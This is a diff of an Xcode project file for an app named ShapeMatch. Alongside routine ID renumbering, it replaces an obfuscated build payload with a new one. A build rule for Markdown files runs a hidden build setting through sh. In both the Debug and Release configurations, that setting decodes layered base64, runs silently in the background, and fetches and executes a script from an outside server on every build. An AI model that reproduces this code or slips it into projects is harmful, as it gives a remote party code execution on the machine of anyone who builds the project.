@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXFileReference section */
-		D4EA6517141340E3B71DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		F69AA34571E64FC6BE1DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		688B93932F59678C00E54DF3 /* ShapeMatch.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = ShapeMatch.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -41,7 +41,7 @@
 		688B93942F59678C00E54DF3 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				D4EA6517141340E3B71DACE1 /* README.md */,
+				F69AA34571E64FC6BE1DACE1 /* README.md */,
 				688B93932F59678C00E54DF3 /* ShapeMatch.app */,
 			);
 			name = Products;
@@ -59,7 +59,7 @@
 				688B93912F59678C00E54DF3 /* Resources */,
 			);
 			buildRules = (
-				D52B9867431E4ECAAC1DACE1 /* PBXBuildRule */,
+				044ECE057D92478EAE1DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -108,7 +108,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		D52B9867431E4ECAAC1DACE1 /* PBXBuildRule */ = {
+		044ECE057D92478EAE1DACE1 /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -122,10 +122,10 @@
 				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
 sh -c \"${A1ECAD1}\"";
 			};
-	/* End PBXBuildRule section */
+		/* End PBXBuildRule section */
 
 /* Begin PBXBuildFile section */
-		8DA8E8602D574298A21DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = D4EA6517141340E3B71DACE1; };
+		0E587D9C291A4850821DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = F69AA34571E64FC6BE1DACE1; };
 /* End PBXBuildFile section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -133,7 +133,7 @@ sh -c \"${A1ECAD1}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				8DA8E8602D574298A21DACE1 /* README.md */,
+				0E587D9C291A4850821DACE1 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -156,7 +156,7 @@ sh -c \"${A1ECAD1}\"";
 		688B939C2F59679000E54DF3 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((t(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YUUwd05VNVRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxWV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5VVFtaFdla1p6V2tSS1YyRlhTblJXYWtKTllsZDRNVlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | t | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((q(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1hMlp6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OW1hV2R0WVc1bGRITXVhVzR2WVNraUlId2djMmdLCg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -221,7 +221,7 @@ sh -c \"${A1ECAD1}\"";
 		688B939D2F59679000E54DF3 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((t(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YUUwd05VNVRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxWV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5VVFtaFdla1p6V2tSS1YyRlhTblJXYWtKTllsZDRNVlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | t | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((q(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1hMlp6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OW1hV2R0WVc1bGRITXVhVzR2WVNraUlId2djMmdLCg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
